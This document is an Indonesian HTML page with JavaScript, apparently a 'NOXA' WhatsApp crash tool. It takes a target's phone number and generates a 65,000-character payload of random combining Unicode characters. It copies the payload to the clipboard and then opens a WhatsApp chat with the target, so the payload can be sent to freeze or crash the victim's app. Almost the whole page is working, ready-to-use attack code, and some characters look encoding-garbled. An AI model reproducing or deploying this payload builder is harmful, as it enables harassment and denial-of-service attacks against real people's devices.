<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>NOXA FINAL BYPASS - 100% CRASH</title>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
        .box { border: 2px solid #00ff00; background: #050505; padding: 25px; box-shadow: 0 0 50px #00ff00; max-width: 600px; margin: auto; border-radius: 10px; }
        h1 { color: #ff0000; text-shadow: 0 0 10px #ff0000; margin-bottom: 5px; }
        .status-bar { background: #111; padding: 10px; border: 1px dashed #00ff00; font-size: 12px; margin-bottom: 20px; color: #fff; }
        textarea { width: 100%; height: 180px; background: #000; color: #ff0000; border: 1px solid #ff0000; font-size: 10px; margin: 15px 0; padding: 10px; box-sizing: border-box; }
        .action-btn { background: #ff0000; color: #fff; padding: 18px; width: 100%; border: none; font-weight: bold; cursor: pointer; font-size: 16px; box-shadow: 0 5px 0 #900; transition: 0.1s; }
        .action-btn:active { box-shadow: none; transform: translateY(5px); }
        .copy-info { color: yellow; font-weight: bold; margin: 10px 0; font-size: 14px; }
    </style>
</head>
<body>
    <div class="box">
        <h1>NOXA CORE V5</h1>
        <div class="status-bar">SURS CORE STATUS: OVERRIDE SUCCESSFUL</div>
        
        <p style="color:#ccc; font-size: 14px;">Masukkan nomor target di bawah:</p>
        <input type="text" id="targetNum" placeholder="628123456789" style="width: 100%; padding: 12px; background: #111; border: 1px solid #00ff00; color: #00ff00; margin-bottom: 15px; box-sizing: border-box;">
        
        <button class="action-btn" onclick="buildAndCopy()">BUILD DEADLY PAYLOAD</button>
        
        <p class="copy-info" id="statusMsg">1. Masukkan nomor, lalu klik tombol di atas.</p>
        
        <textarea id="payloadResult" readonly placeholder="Payload akan muncul di sini..."></textarea>
        
        <div id="finalStep" style="display:none;">
            <p style="color: #fff;">Payload Terdeteksi di Clipboard!</p>
            <button class="action-btn" style="background: #00ff00; color: #000;" onclick="goToWA()">BUKA WHATSAPP SEKARANG</button>
        </div>
    </div>

    <script>
        function buildAndCopy() {
            const num = document.getElementById('targetNum').value;
            if(!num) { alert("Masukkan nomor target!"); return; }

            const statusMsg = document.getElementById('statusMsg');
            const pBox = document.getElementById('payloadResult');
            const finalStep = document.getElementById('finalStep');

            // Payload Gabungan Paling Berat (Unicode Brahmic + Thai + Arabic)
            let p = "NOXA_DEADLY_BYPASS_";
            let chars = ["·Ä™", "ÍßÄ", "‡•£", "‡•Ä", "‡•Ç", "‡§æ", "‡•ç", "‡§ø", "“à", "Ô∑Ω", "íÄ±"];
            for(let i=0; i<65000; i++) {
                p += chars[Math.floor(Math.random() * chars.length)];
            }

            pBox.value = p;
            pBox.select();
            document.execCommand('copy');

            statusMsg.innerHTML = "‚úÖ PAYLOAD 65.000 CHARS BERHASIL DISALIN!";
            statusMsg.style.color = "#00ff00";
            finalStep.style.display = "block";
        }

        function goToWA() {
            const num = document.getElementById('targetNum').value;
            window.location.href = "https://wa.me/" + num;
        }
    </script>
</body>
</html>
